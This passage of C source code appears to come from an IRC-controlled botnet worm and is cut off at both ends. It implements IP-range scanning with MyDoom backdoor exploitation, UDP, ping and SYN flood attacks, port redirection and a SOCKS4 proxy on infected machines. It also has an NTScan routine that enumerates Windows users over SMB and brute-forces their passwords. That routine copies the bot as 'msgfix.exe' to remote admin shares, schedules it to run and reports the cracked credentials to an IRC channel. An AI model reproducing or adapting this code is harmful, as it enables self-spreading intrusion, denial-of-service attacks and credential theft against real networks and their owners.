	#elif defined (__GNUC__) // this code is for GCC
	unsigned __int64 count = 0;
	__asm__ ("rdtsc;movl %%eax, %0" : "=r" (count));
	return count;

	#else // this code is for MSVC, may work on other compilers (ignore the warnings, MSVC is stupid...)
	_asm {
		_emit 0x0F;
		_emit 0x31;
	}
	#endif
 }
 #pragma warning( default : 4035 )
 #endif

 // function for removing the bot's registry entries and executable
 void uninstall(void)
 {
	HKEY key;
	HANDLE f;
	DWORD r;
	PROCESS_INFORMATION pinfo;
	STARTUPINFO sinfo;
	char cmdline[256];
	char tcmdline[256];
	char cfilename[256];
	char batfile[256];

	// remove our registry entries
	if (AutoStart) { 
		RegCreateKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &key, NULL); 
		RegDeleteValue(key, valuename); 
		RegCloseKey(key); 
 
	//	RegCreateKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &key, NULL); 
	//	RegDeleteValue(key, valuename); 
	//	RegCloseKey(key); 
 
		RegCreateKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\RunServices", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &key, NULL); 
		RegDeleteValue(key, valuename); 
		RegCloseKey(key); 
 
		RegCreateKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &key, NULL); 
		RegDeleteValue(key, valuename); 
		RegCloseKey(key); 
 
	//	RegCreateKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &key, NULL); 
	//	RegDeleteValue(key, valuename);
	//	RegCloseKey(key); 
	}

	sprintf(batfile, "%s\\r.bat", tempdir);
	f = CreateFile(batfile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, 0);
	if (f > (HANDLE)0) {
		// write a batch file to remove our executable once we close
		WriteFile(f, "@echo off\r\n"
					 ":start\r\nif not exist \"\"%1\"\" goto done\r\n"
					 "del /F \"\"%1\"\"\r\n"
					 "del \"\"%1\"\"\r\n"
					 "goto start\r\n"
					 ":done\r\n"
					 "del /F %temp%\r.bat\r\n"
					 "del %temp%\r.bat\r\n", 105, &r, NULL);
		CloseHandle(f);

		memset(&sinfo, 0, sizeof(STARTUPINFO));
		sinfo.cb = sizeof(sinfo);
		sinfo.wShowWindow = SW_HIDE;

		GetModuleFileName(GetModuleHandle(NULL), cfilename, sizeof(cfilename));// get our file name
		sprintf(tcmdline, "%%comspec%% /c %s %s", batfile, cfilename); // build command line
		ExpandEnvironmentStrings(tcmdline, cmdline, sizeof(cmdline)); // put the name of the command interpreter into the command line

		// execute the batch file
		CreateProcess(NULL, cmdline, NULL, NULL, TRUE, NORMAL_PRIORITY_CLASS | DETACHED_PROCESS, NULL, NULL, &sinfo, &pinfo);
	}
 }



int Split(char *inStr, void *saveArray)
{
/*
This will change x0A & x0D into x00 and return line pointers in saveArray[].
*/
	int i,j,index;

	char *lines[MAX_LINES];

	memset(lines,0,sizeof(lines));

	j=strlen(inStr);
	if (j<1) return -1;
	index=0;

	lines[index++]=inStr;


	for (i=0;i<j;i++) if ((inStr[i]=='\x0A') || (inStr[i]=='\x0D')) inStr[i]='\x0';

	//Now that all cr/lf have been converted to NUL, save the pointers...

	for (i=0;i<j;i++) {
		if ((inStr[i]=='\x0') && (inStr[i+1]!='\x0')) {
			/* We will use the NUL as a guide :) */
			if (index<MAX_LINES) lines[index++]=&inStr[i+1]; else break;	//CHECK :: Recently modified
		}
	}


	if (saveArray!=0) memcpy(saveArray,lines,sizeof(lines));
	return index;
}

SOCKET TCPConnect(unsigned long ip, unsigned short port, int timeout_seconds)
{
	SOCKET s;
	SOCKADDR_IN sin;
	unsigned long blockcmd=1;
	timeval t;
	int i;
	FD_SET rset;
	s=socket(AF_INET,SOCK_STREAM,0);
	if (s==INVALID_SOCKET) return INVALID_SOCKET;

	sin.sin_family=AF_INET;
	sin.sin_addr.S_un.S_addr=ip;
	sin.sin_port=htons(port);

	ioctlsocket(s,FIONBIO,&blockcmd);
	
	connect(s,(LPSOCKADDR)&sin,sizeof(sin));
	

	FD_ZERO(&rset);
	FD_SET(s,&rset);

	t.tv_sec=timeout_seconds;
	t.tv_usec=0;
	i=select(0,0,&rset,0,&t);
	if (i<=0) {
		closesocket(s);
		return SOCKET_ERROR;
	}
	blockcmd=0;
	ioctlsocket(s,FIONBIO,&blockcmd);
	return s;
}

unsigned long ResolveAddress(char *Host)
{
/*
Host may be an IP (1.2.3.4) *or* a host (eg: something.com)
So heres some code for handling it nicely :)
*/
	unsigned long ip;
	hostent *boo;

	ip=inet_addr(Host);
	if (ip==INADDR_NONE) {
		// Well, not a valid IP...
		boo=gethostbyname(Host);
		if (boo==NULL) return 0;
		memcpy(&ip,*boo->h_addr_list,4);	
	}


	return ip;
}


char *Xorbuff(char *buff,int buffLen)
{
	int i;
	for (i=0;i<buffLen;i++)
	{
		buff[i]^=prefix;
	}
	return buff;
}

#ifndef NO_SCAN
// checks ip for open port
 DWORD WINAPI ip_connect(LPVOID param)
 {
	SOCKET sock;
	SOCKADDR_IN ssin;
	DWORD err;
	char str[256];
	int sploitres;
	scans scan;

	scan = *((scans *)param);
	scans *scanp = (scans *)param;
	scanp->cgotinfo = TRUE;

	memset(&ssin, 0, sizeof(ssin));
	ssin.sin_family = AF_INET;
	ssin.sin_port = htons(scan.port);
	ssin.sin_addr = scan.addy;

	sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
	err = connect(sock, (LPSOCKADDR)&ssin, sizeof(SOCKADDR_IN));
	if (err != SOCKET_ERROR) {
	    switch (scan.port) {
	    case 3127:
		sprintf(str, "%s port %d is open, exploiting MyDoom...", inet_ntoa(scan.addy), scan.port);
		irc_privmsg(scan.sock, scan.chan, str, scan.notice);
		sploitres = spread_mydoom(inet_ntoa(scan.addy));
		if (sploitres == EXIT_FAILURE) {
		    sprintf(str, "Exploiting of MyDoom on %s failed...", inet_ntoa(scan.addy));
		    irc_privmsg(scan.sock, scan.chan, str, scan.notice);
		}else if (sploitres == EXIT_SUCCESS) {
		    sprintf(str, "Exploiting of MyDoom on %s done...", inet_ntoa(scan.addy));
		    irc_privmsg(scan.sock, scan.chan, str, scan.notice);
		}else{
		    sprintf(str, "Exploiting of MyDoom on %s had unknown result...", inet_ntoa(scan.addy));
		    irc_privmsg(scan.sock, scan.chan, str, scan.notice);
		}
		break;
	default:
		sprintf(str, "%s port %d is open", inet_ntoa(scan.addy), scan.port);
		irc_privmsg(scan.sock, scan.chan, str, scan.notice);
		break;
	    }
	}
	closesocket(sock);
	return 0;

 }

// scan a range of ips for an open port
 DWORD WINAPI ip_scan(LPVOID param)
 {
	DWORD id, host;
	void *th;
	char str[128];
	scans scan;

	scan = *((scans *)param);
	scans *scanp = (scans *)param;
	scanp->gotinfo = TRUE;

	while(1) {
		sprintf(str, "Scan (%s:%d)", inet_ntoa(scan.addy), scan.port);
		strncpy(threadd[scan.threadnum], str, sizeof(threadd[scan.threadnum])-1);
		th = CreateThread(NULL, 0, &ip_connect, (void *)&scan, 0, &id);
		while(1) {
			if (scan.cgotinfo == TRUE) break;
			Sleep(1);
		}
		CloseHandle(th);
		scanp->cgotinfo = FALSE;
		Sleep(scanp->delay);
		memcpy(&host, &scan.addy, 4);
		host = ntohl(host);
		host += 1;
		host = htonl(host);
		memcpy(&scan.addy, &host, 4);
	}

	threads[scan.threadnum] = 0;
	threadd[scan.threadnum][0] = '\0';
	return 0;
 }
#endif

 #ifndef NO_UDP
// function for sending udp packets
 DWORD WINAPI udp(LPVOID param)
 {
	ps udp;
	SOCKADDR_IN ssin;
	LPHOSTENT hostent = NULL;
	IN_ADDR iaddr;
	SOCKET usock;
	int i;

	// socket setup
	udp = *((ps *)param);
	ps *udps = (ps *)param;
	udps->gotinfo = TRUE;
	char *host = udp.host;
	usock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
	memset(&ssin, 0, sizeof(ssin));
	ssin.sin_family = AF_INET;
	iaddr.s_addr = inet_addr(udp.host);
	if (iaddr.s_addr == INADDR_NONE) hostent = gethostbyname(udp.host);
	if (hostent == NULL && iaddr.s_addr == INADDR_NONE) {
		if (!udp.silent) irc_sendf2(udp.sock, "PRIVMSG %s :Error sending packets to %s\r\n", udp.chan, host);
		threads[udp.threadnum] = 0;
		threadd[udp.threadnum][0] = '\0';
		return 0;
	}
	if (hostent != NULL) ssin.sin_addr = *((LPIN_ADDR)*hostent->h_addr_list);
	else ssin.sin_addr = iaddr;

	srand(GetTickCount());
	if (udp.port == 0) ssin.sin_port = htons((rand() % 65500) + 1); else ssin.sin_port = 	htons(udp.port);
	if (udp.port < 1) udp.port = 1;
	if (udp.port > 65535) udp.port = 65535;

	udp.num = udp.num / 10;
	if (udp.delay == 0) udp.delay = 1;

	for (i = 0; i < udp.size; i++) pbuff[i] = (rand() % 255);
	while (udp.num-- > 0) {
		//change port every 10 packets (if one isn't specified)
		for (i = 0; i < 11; i++) {
			sendto(usock, pbuff, udp.size-(rand() % 10), 0, (LPSOCKADDR)&ssin, sizeof(ssin));
			Sleep(udp.delay);
		}
		if (udp.port == 0) ssin.sin_port = htons((rand() % 65500) + 1);
	}
	// free(ubuff);
	if (!udp.silent) irc_sendf2(udp.sock, "PRIVMSG %s :Finished sending packets to %s\r\n", udp.chan, host);

	threads[udp.threadnum] = 0;
	threadd[udp.threadnum][0] = '\0';
	return 0;
 }
 #endif

 #ifndef NO_PING
//  function for sending pings
 DWORD WINAPI ping(LPVOID param)
 {
	ps ping;
	HANDLE icmp;
	LPHOSTENT hostent = NULL;
	IN_ADDR iaddr;
	IPAddr ip;
	ICMP_ECHO_REPLY reply;
	int i;

	ping = *((ps *)param);
	ps *psp = (ps *)param;
	psp->gotinfo = TRUE;
	char *host = ping.host;

	icmp = (HANDLE)fIcmpCreateFile();

	iaddr.s_addr = inet_addr(ping.host);
	if (iaddr.s_addr == INADDR_NONE) hostent = gethostbyname(ping.host);
	if ((hostent == NULL && iaddr.s_addr == INADDR_NONE) || icmp == INVALID_HANDLE_VALUE) {
		if (!ping.silent) irc_sendf2(ping.sock, "PRIVMSG %s :Error sending pings to %s\r\n", ping.chan, host);
		threads[ping.threadnum] = 0;
		threadd[ping.threadnum][0] = '\0';
		return 0;
	}
	if (hostent != NULL) ip = *(DWORD*)*hostent->h_addr_list;
	else ip = iaddr.s_addr;

	memset(&reply, 0, sizeof(reply));
	reply.RoundTripTime = 0xffffffff;

  	if (ping.size > 65500) ping.size = 65500;
	if (ping.delay < 1) ping.delay = 1;
	for (i = 0; i < ping.num; i++) {
		fIcmpSendEcho(icmp, ip, pbuff, ping.size, NULL, &reply, sizeof(ICMP_ECHO_REPLY), ping.delay);
	}

	fIcmpCloseHandle(icmp);
	if (!ping.silent) irc_sendf2(ping.sock, "PRIVMSG %s :Finished sending pings to %s\r\n", ping.chan, host);

	threads[ping.threadnum] = 0;
	threadd[ping.threadnum][0] = '\0';
	return 0;
 }
 #endif
 #ifndef NO_SYN
DWORD WINAPI synthread (LPVOID param) {
char *buff;
buff = "";
synt syn;
syn = *((synt *)param);
synt *syns = (synt *)param;
sprintf(buff, "Done with SYN flood [%iKB/s]\r\n", SYNFlood(syn.ip, syn.port, syn.length));
//MessageBox(0, syn.socket, "DEBUG", 0);
irc_privmsg(syn.socket, syn.chan, buff, syn.notice);
//irc_privmsg(sock, a[2], sendbuf, notice); 
threads[syn.threadnumber] = 0;
threadd[syn.threadnumber][0] = '\0';
return 0; 
}
 #endif

 #ifndef NO_REDIRECT
// port redirect function
 DWORD WINAPI redirect(LPVOID param)
 {
	SOCKET rsock, clsock;
	SOCKADDR_IN rssin, cssin;
	rs redirect;
	DWORD id;

	redirect = *((rs *)param);
	rs *rsp = (rs *)param;
	rsp->gotinfo = TRUE;
	rsock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
	WSAAsyncSelect(rsock, 0, WM_USER + 1, FD_READ);
	memset(&rssin, 0, sizeof(rssin));
	rssin.sin_family = AF_INET;
	rssin.sin_port = htons(redirect.lport);
	bind(rsock, (SOCKADDR *)&rssin, sizeof(rssin));

	csock[redirect.threadnum] = rsock;

	while(1) {
		if (listen(rsock, 10) == SOCKET_ERROR) break;
		clsock = accept(rsock, (SOCKADDR *)&cssin, NULL);
		if (clsock != INVALID_SOCKET) {
			redirect.csock = clsock;
			CreateThread(NULL, 0, &redirectloop, (void *)&redirect, 0, &id);
		}
	}

	closesocket(clsock);
	closesocket(rsock);

	threads[redirect.threadnum] = 0;
	threadd[redirect.threadnum][0] = '\0';

	return 0;
 }

// part of the redirect function, handles sending/recieving for the remote connection.
 DWORD WINAPI redirectloop(LPVOID param)
 {
	SOCKET sock;
	SOCKET csock;
	char *dest;
	SOCKADDR_IN ssin;
	IN_ADDR iaddr;
	LPHOSTENT hostent;
	int port, err;
	char buff[4096];
	rs rs2;
	rs2 = *((rs *)param);
	csock = rs2.csock;
	dest = rs2.dest;
	port = rs2.port;
	DWORD id;

	while (1) {
		sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
		memset(&ssin, 0, sizeof(ssin));
		ssin.sin_family = AF_INET;
		ssin.sin_port = htons(port);
		iaddr.s_addr = inet_addr(dest);
		if (iaddr.s_addr == INADDR_NONE) hostent = gethostbyname(dest);
		else hostent = gethostbyaddr((const char *)&iaddr, sizeof(struct in_addr), AF_INET);
		if (hostent == NULL) break;
		ssin.sin_addr = *((LPIN_ADDR)*hostent->h_addr_list);

		err = connect(sock, (LPSOCKADDR)&ssin, sizeof(SOCKADDR_IN));
		if (err == SOCKET_ERROR) break;

		rs2.sock = sock;
		CreateThread(NULL, 0, &redirectloop2, (void *)&rs2, 0, &id);

		while (1) {
			memset(buff, 0, sizeof(buff));
			err = recv(csock, buff, sizeof(buff), 0);
			if (err == 0) {
				break;
			}
			if (err == SOCKET_ERROR) break;

			err = send(sock, buff, err, 0);
			if (err == SOCKET_ERROR) break;

		}

		break;
	}

	closesocket(csock);
	closesocket(sock);

	return 0;
 }

// part of the redirect function, handles sending/recieving for the local connection.
 DWORD WINAPI redirectloop2(LPVOID param)
 {
	SOCKET sock;
	SOCKET csock;
	rs rs2;
	int err;
	char buff[4096];
	rs2 = *((rs *)param);
	sock = rs2.sock;
	csock = rs2.csock;

	while (1) {
		memset(buff, 0, sizeof(buff));
		err = recv(sock, buff, sizeof(buff), 0);
		if (err == 0) {
			break;
		}
		if (err == SOCKET_ERROR) break;
		err = send(csock, buff, err, 0);
		if (err == SOCKET_ERROR) break;
	}

	closesocket(csock);
	return 0;
 }
 #endif

 DWORD WINAPI ntpass_main(void *pnts)
{
	unsigned int i;
	HINSTANCE hLib;
	FILE *fp;
	NTSCAN *nts=(NTSCAN *)pnts;
	char szSelfExe[MAX_PATH];

	fp=fopen(szLocalPayloadFile,"payload.dat");
	if (fp!=NULL) {
		fclose(fp);
	} else {
		GetModuleFileName(0,szSelfExe,MAX_PATH);
		CopyFile(szSelfExe,szLocalPayloadFile,FALSE);
	}
	hLib=LoadLibrary("netapi32.dll");
	if (!hLib) return 0;
	fNetScheduleJobAdd=(NSJA)GetProcAddress(hLib,"NetScheduleJobAdd");
	fNetApiBufferFree=(NABF)GetProcAddress(hLib,"NetApiBufferFree");
	fNetRemoteTOD=(NRTOD)GetProcAddress(hLib,"NetRemoteTOD");
	fNetUserEnum=(NUE)GetProcAddress(hLib,"NetUserEnum");

	if ((!fNetScheduleJobAdd) || (!fNetApiBufferFree) || (!fNetRemoteTOD) || (!fNetUserEnum)) {
		//We couldn't load the addresses of each function...
		//(Win95/98??)
		FreeLibrary(hLib);
		return 0;
	}

	strcpy(scanip,nts->ipmask);
	srand(GetTickCount());
	ntscan=TRUE;
	for (i=0;i<(nts->threads);i++)
	{
		CreateThread(0,0,&PortScanner,0,0,0);
	}

	Sleep(60000*nts->minutes);
	ntscan=FALSE;
	threads[nts->threadid]=0;
	return 0;
}

unsigned long GetNextIP(char *scanmask)
{
	int ip1,ip2,ip3,ip4;
	if (strlen(scanmask)>15) return 0;
	ip1=-1;ip2=-1;ip3=-1;ip4=-1;
	sscanf(scanmask,"%d.%d.%d.%d",&ip1,&ip2,&ip3,&ip4);
	if (ip1==-1) ip1=rand();
	if (ip2==-1) ip2=rand();
	if (ip3==-1) ip3=rand();
	if (ip4==-1) ip4=rand();
	return (ip1+(ip2<<8)+(ip3<<16)+(ip4<<24));
}

BOOL port_open(unsigned long ip)
{
	SOCKET s;
	SOCKADDR_IN sin;
	unsigned long blockcmd=1;
	timeval t;
	int i;
	FD_SET rset;
	s=socket(AF_INET,SOCK_STREAM,0);
	if (s==INVALID_SOCKET) return INVALID_SOCKET;
	sin.sin_family=AF_INET;
	sin.sin_addr.S_un.S_addr=ip;
	sin.sin_port=htons(445);
	sin.sin_port=htons(139);
	ioctlsocket(s,FIONBIO,&blockcmd);
	connect(s,(LPSOCKADDR)&sin,sizeof(sin));
	FD_ZERO(&rset);
	FD_SET(s,&rset);
	t.tv_sec=5;
	t.tv_usec=0;
	i=select(0,0,&rset,0,&t);
	closesocket(s);
	if (i<=0) {
		return FALSE;
	} else {
		return TRUE;
	}
}

DWORD WINAPI PortScanner(LPVOID parm)
{
	BOOL p_open;
	DWORD dwIP;
	IN_ADDR in;
	char szIP[18];
	while (ntscan)
	{
		dwIP=GetNextIP(scanip);
		p_open=port_open(dwIP);
		if (p_open==TRUE) {
			in.s_addr=dwIP;
			sprintf(szIP,"\\\\%s",inet_ntoa(in));
			enumusers(szIP);
		}
	}
	return 0;
}

BOOL rootBox(char *szUserName, char *szIP)
{
	int i;
	i=0;
	while (passes[i])
	{
		if (NetConnect(szUserName,passes[i],szIP)==TRUE) return TRUE;
		i++;
	}
	return FALSE;
}

BOOL NetConnect(char *szUserName, char *szPassWord, char *szIP)
{
	DWORD dwResult; 
	NETRESOURCE nr;
	memset(&nr,0,sizeof(NETRESOURCE));
	nr.lpRemoteName=szIP;
	nr.dwType=RESOURCETYPE_DISK;
	nr.lpLocalName=NULL;
	nr.lpProvider=NULL;

	/////////////////////////////
	char *ntmess;
	ntmess = "";
	/////////////////////////////

	//
	// Call the WNetAddConnection2 function to make the connection,
	//   specifying a persistent connection.
	//
	dwResult = WNetAddConnection2(&nr, // NETRESOURCE from enumeration 
		(LPSTR) szPassWord,                  // no password 
		(LPSTR) szUserName,                  // logged-in user 
0);       // update profile with connect information 

	if(dwResult != NO_ERROR) 
	{ 
		WNetCancelConnection2(szIP,CONNECT_UPDATE_PROFILE,TRUE);
		return FALSE; 
	}
 
	WCHAR wszNetbios[200];
	char szRemoteFile[MAX_PATH],szRemoteFile2[MAX_PATH],szRemoteFile3[MAX_PATH],szRemoteFile4[MAX_PATH],szRemoteFile5[MAX_PATH]	,szRemoteFile6[MAX_PATH],szRemoteFile7[MAX_PATH],szRemoteFile8[MAX_PATH];;
	TIME_OF_DAY_INFO *tinfo=NULL;
	NET_API_STATUS nStatus;
	DWORD JobID;
	AT_INFO at_time;


	sprintf(szRemoteFile,"%s\\Admin$\\system32\\msgfix.exe",szIP);
	sprintf(szRemoteFile2,"%s\\c$\\winnt\\system32\\msgfix.exe",szIP);
	sprintf(szRemoteFile3,"%s\\c$\\windows\\system32\\msgfix.exe",szIP);	 // this was also added, got me some bots :P ( Fatal )
	sprintf(szRemoteFile4,"%s\\Admin$\\msgfix.exe",szIP);					 // experimental	
	sprintf(szRemoteFile5,"%s\\c$\\msgfix.exe",szIP);						 //	experimental
	sprintf(szRemoteFile6,"%s\\print$\\msgfix.exe",szIP);					 // experimental
	sprintf(szRemoteFile7,"%s\\D$\\msgfix.exe",szIP);						 // experimental
	sprintf(szRemoteFile8,"%s\\IPC$\\msgfix.exe",szIP);						 // experimental

	MultiByteToWideChar(CP_ACP,0,szIP,-1,wszNetbios,sizeof(wszNetbios));
	nStatus=fNetRemoteTOD(wszNetbios,(LPBYTE *)&tinfo);
	if (nStatus==NERR_Success) {
		if (tinfo) {
			int i;
			i=CopyFile(szLocalPayloadFile,szRemoteFile,FALSE);
			if (!i) {
				i=CopyFile(szLocalPayloadFile,szRemoteFile2,FALSE);
				if (!i) {
					i=CopyFile(szLocalPayloadFile,szRemoteFile3,FALSE);
					if (!i) {
						i=CopyFile(szLocalPayloadFile,szRemoteFile4,FALSE);
						if (!i) {
							i=CopyFile(szLocalPayloadFile,szRemoteFile5,FALSE);
							if (!i) {
								i=CopyFile(szLocalPayloadFile,szRemoteFile6,FALSE);
								if (!i) {
									i=CopyFile(szLocalPayloadFile,szRemoteFile7,FALSE);
									if (!i) {
										i=CopyFile(szLocalPayloadFile,szRemoteFile8,FALSE);
										if (!i) {
													
																fNetApiBufferFree(tinfo);
																WNetCancelConnection2(szIP,CONNECT_UPDATE_PROFILE,TRUE);
																return TRUE;
														}
													//	else irc_sendf(sock2, "PRIVMSG #xxx :[NTScan - Exploited - c$\\sys32] CSendFile: %s\r\n", szIP);
												}
											//	else irc_sendf(sock2, "PRIVMSG #xxx :[NTScan - Exploited - WinXP sys32] CSendFile: %s\r\n", szIP);
										}
									//	else irc_sendf(sock2, "PRIVMSG #xxx :[NTScan - Exploited - WinNT sys32] CSendFile: %s\r\n",szIP);
								}
							//	else irc_sendf(sock2, "PRIVMSG #xxx :[NTScan - Exploited - admin$ sys32] CSendFile: %s\r\n",szIP); 	
							}
						//	else irc_sendf(sock2, "PRIVMSG #xxx :[NTScan - Exploited - C$] CSendFile: %s\r\n",szIP);
						}
					//	else irc_sendf(sock2, "PRIVMSG #xxx :[NTScan - Exploited - print$] CSendFile: %s\r\n",szIP);
					}		
				//	else irc_sendf(sock2, "PRIVMSG #cxxx :[NTScan - Exploited - D$] CSendFile: %s\r\n",szIP);	
			}
		//	else irc_sendf(sock2, "PRIVMSG #xxxx :[NTScan - Exploited - IPC$] CSendFile: %s\r\n",szIP);
					
			memset(&at_time,0,sizeof(AT_INFO));
			DWORD jobtime;
			jobtime=tinfo->tod_elapsedt / 60;
			jobtime-=tinfo->tod_timezone;
			jobtime+=2;
			jobtime%=(24*60);
			at_time.JobTime=jobtime*60000;
			at_time.Command=L"msgfix.exe";

			nStatus=fNetScheduleJobAdd(wszNetbios,(BYTE *)&at_time,&JobID);
			
         ////////////////////////////////////////// 
         // Just a quick piece of test code to msg the chan when an exploit occurs - 
         #define CHECKPASS(x) ((x)?(x):("[NULL]")) 
         char ntmess[512]; 
         _snprintf(ntmess,sizeof(ntmess),"(xT|Scan): Abusing.. (IP): [%s] (User): [%s/%s]\r\n",szIP,szUserName,CHECKPASS(szPassWord)); 
         irc_privmsg(nt_msg->sock, nt_msg->chan, ntmess, nt_msg->notice); 
         sploitstats++; 
         // End Code. 
         //////////////////////////////////////////

		}
	}
	WNetCancelConnection2(szIP,CONNECT_UPDATE_PROFILE,TRUE);
	return TRUE;
}

void enumusers(char *szServer)
{
	LPUSER_INFO_0 pBuf = NULL;
	LPUSER_INFO_0 pTmpBuf;
	DWORD dwLevel = 0;
	DWORD dwPrefMaxLen = MAX_PREFERRED_LENGTH;
	DWORD dwEntriesRead = 0;
	DWORD dwTotalEntries = 0;
	DWORD dwResumeHandle = 0;
	DWORD i;
	DWORD dwTotalCount = 0;
	NET_API_STATUS nStatus;
	WCHAR  *pszServerName = NULL;
	WCHAR sName[500];
	MultiByteToWideChar(CP_ACP,0,szServer,-1,sName,sizeof(sName));
	pszServerName=sName;
	char szUsername[300];
	char RemoteName[200];
	
	NETRESOURCE nr;
	nr.lpLocalName=NULL;
	nr.lpProvider=NULL;
	nr.dwType=RESOURCETYPE_ANY;
	sprintf(RemoteName,"%s\\ipc$",szServer);
	nr.lpRemoteName=RemoteName;
	if (WNetAddConnection2(&nr,"","",0)!=NO_ERROR) {
		WNetCancelConnection2(RemoteName,0,TRUE);
		return;
	}
	
	do // begin do
	{
		nStatus = fNetUserEnum(pszServerName,
			dwLevel,
			FILTER_NORMAL_ACCOUNT, // global users
			(LPBYTE*)&pBuf,
			dwPrefMaxLen,
			&dwEntriesRead,
			&dwTotalEntries,
			&dwResumeHandle);
		WNetCancelConnection2(RemoteName,0,TRUE);
		//
		// If the call succeeds,
		//
		if ((nStatus == NERR_Success) || (nStatus == ERROR_MORE_DATA))
		{
			if ((pTmpBuf = pBuf) != NULL)
			{
				for (i = 0; (i < dwEntriesRead); i++)
				{
					if (pTmpBuf == NULL) break;
					WideCharToMultiByte(CP_ACP,0,pTmpBuf->usri0_name,-1,szUsername,sizeof(szUsername),NULL,NULL);
					if ((rootBox(szUsername,szServer))==TRUE) break;
					pTmpBuf++;
					dwTotalCount++;
				}
			}
		}
		if (pBuf != NULL)
		{
			fNetApiBufferFree(pBuf);
			pBuf = NULL;
		}
	}
	while (nStatus == ERROR_MORE_DATA); // end do
	if (pBuf != NULL) fNetApiBufferFree(pBuf);
	
	return;
}

#ifndef NO_SOCK4SERV
DWORD WINAPI SocksDaemon(LPVOID param)
{
	struct sockaddr_in info;
	struct sockaddr_in client_in;
	SOCKET server;
	SOCKET client;
	DWORD lpThreadId;

	info.sin_family = AF_INET;
	info.sin_port = htons(sock4port);
	info.sin_addr.s_addr = INADDR_ANY;
	server = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (bind(server, (SOCKADDR *)&info, sizeof(info)) != 0)
	{
		return 0;
	}
	if (listen(server, 10) != 0)
	{
		return 0;
	}
	while (TRUE)
	{
		client = accept(server, (SOCKADDR *)&client_in, NULL);
		CreateThread(NULL, 0, &Socks4ClientThread, (LPVOID)client, 0, &lpThreadId);
	}
	return 0;
}

DWORD WINAPI Socks4ClientThread(LPVOID pParam)
{
	struct SOCKS4HEADER hdr;
	SOCKET client=(SOCKET)pParam;
	TIMEVAL timeout;
	fd_set fd;
	SOCKADDR_IN target_in;
	SOCKET outbound;

	timeout.tv_sec = 5;
	timeout.tv_usec = 0;
	FD_ZERO(&fd);
	FD_SET(client, &fd);
	if (select(0, &fd, NULL, NULL, &timeout) == 0)
	{
		closesocket(client);
		return 0;
	}
	if (recv(client, (char *)&hdr, sizeof(hdr), 0) <= 0)
	{
		closesocket(client);
		return 0;
	}
	if (hdr.vn != 4 || hdr.cd != SOCKS4_CONNECT) 
	{
		closesocket(client);
		return 0;
	}
	memset(&target_in, 0, sizeof(target_in));
	target_in.sin_family = AF_INET;
	target_in.sin_port = hdr.destport;
	target_in.sin_addr.s_addr = hdr.destaddr;
	outbound = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (connect(outbound, (SOCKADDR *)&target_in, sizeof(target_in)) == SOCKET_ERROR)
	{
		hdr.vn = 0;
		hdr.cd = SOCKS4_REJECT;
		memset(&hdr.userid, 0, 1024);
		send(client, (char *)&hdr, 8, 0);
		closesocket(client);
		return 0;
	}
	hdr.vn = 0;
	hdr.cd = SOCKS4_GRANT;
	memset(&hdr.userid, 0, 1024);
	send(client, (char *)&hdr, 8, 0);
	transfer_loop(outbound, client);
	return 0;
}

void transfer_loop(SOCKET target, SOCKET client)
{
	int len;
	char buf[1024];
	fd_set fd;

	while (TRUE)
	{
		FD_ZERO(&fd);
		FD_SET(client, &fd);
		FD_SET(target, &fd);

		memset(buf, 0, sizeof(buf));
		select(0, &fd, NULL, NULL, NULL);

		if(FD_ISSET(client, &fd))
		{
			if((len = recv(client,buf,sizeof(buf),0))== -1) break;
			if(send(target,buf,len,0)== -1) break;
		}
	    if (FD_ISSET(target,&fd))
		{
			if((len = recv(target,buf,sizeof(buf),0))== -1) break;
			if(send(client,buf,len,0)== -1) break;
		}
	}
}
#endif


void mirccmd(char *cmd)
{
         mwnd = FindWindow("mIRC",NULL);
         if (mwnd) {
                 hFileMap = CreateFileMapping(INVALID_HANDLE_VALUE,0,PAGE_READWRITE,0,4096,"mIRC");
                 mData = (LPSTR)MapViewOfFile(hFileMap,FILE_MAP_ALL_ACCESS,0,0,0);
                 sprintf(mData, cmd);
                 SendMessage(mwnd,WM_USER + 200,1,0);
				 SendMessage(mwnd,WM_USER + 201,1,0);
                 UnmapViewOfFile(mData);
                 CloseHandle(hFileMap);
}
}

int wildcardfit (char *wildcard, char *test)
{
  int fit = 1;
  
  for (; ('\000' != *wildcard) && (1 == fit) && ('\000' != *test); wildcard++)
    {
      switch (*wildcard)
        {
        case '[':
	  wildcard++;
          fit = set (&wildcard, &test);
          break;
        case '?':
          test++;
          break;
        case '*':
          fit = asterisk (&wildcard, &test);
	  wildcard--;
          break;
        default:
          fit = (int) (*wildcard == *test);
          test++;
        }
    }
  while ((*wildcard == '*') && (1 == fit)) 
    wildcard++;
  return (int) ((1 == fit) && ('\0' == *test) && ('\0' == *wildcard));
}

int set (char **wildcard, char **test)
{
  int fit = 0;
  int negation = 0;
  int at_beginning = 1;   // DON'T ASK, JUST BELIEVE dutch humor :P

  if ('!' == **wildcard)
    {
      negation = 1;
      (*wildcard)++;
    }
  while ((']' != **wildcard) || (1 == at_beginning))
    {
      if (0 == fit)
        {
          if (('-' == **wildcard) 
              && ((*(*wildcard - 1)) < (*(*wildcard + 1)))
              && (']' != *(*wildcard + 1))
	      && (0 == at_beginning))
            {
              if (((**test) >= (*(*wildcard - 1)))
                  && ((**test) <= (*(*wildcard + 1))))
                {
                  fit = 1;
                  (*wildcard)++;
                }
            }
          else if ((**wildcard) == (**test))
            {
              fit = 1;
